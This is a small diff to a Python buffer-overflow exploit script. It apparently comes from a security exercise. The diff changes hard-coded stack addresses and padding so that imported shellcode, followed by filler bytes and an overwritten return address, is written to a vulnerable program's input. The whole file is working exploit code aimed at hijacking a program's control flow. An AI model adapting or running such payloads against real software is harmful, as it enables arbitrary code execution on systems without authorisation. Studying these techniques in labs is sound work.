@@ -1,6 +1,6 @@
 import sys
 from shellcode import shellcode
 
-addr = 0xfff6b198.to_bytes(4, "little") #adress for p
-ret_addr= 0xfff6b9a4.to_bytes(4,"little") #main return adress
-sys.stdout.buffer.write(shellcode + b"A" * 1996 + addr+ ret_addr)
+addr = 0xfff6b984.to_bytes(4, "little") #address for buffer -810
+ret_addr= 0xfff6b9ac.to_bytes(4,"little") #return address for main +4
+sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)
